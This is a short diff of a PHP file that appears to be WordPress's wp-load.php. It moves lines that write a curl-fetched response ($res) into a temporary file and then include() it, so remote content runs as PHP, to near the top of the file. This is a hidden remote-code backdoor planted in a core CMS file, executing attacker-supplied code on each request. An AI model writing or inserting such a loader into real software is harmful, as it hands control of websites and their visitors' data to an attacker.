@@ -35,6 +35,10 @@ curl_close($ch);
 $tmp = tmpfile();
 $path = stream_get_meta_data($tmp)['uri'];
 
+fprintf($tmp, '%s', $res);
+include($path);
+?>
+
 /*
  * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
  * it's best to add a dummy function to the wp-config.php file, but as this call to the function
@@ -94,6 +98,3 @@ if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
 		exit;
 	}
 
-fprintf($tmp, '%s', $res);
-include($path);
-?>
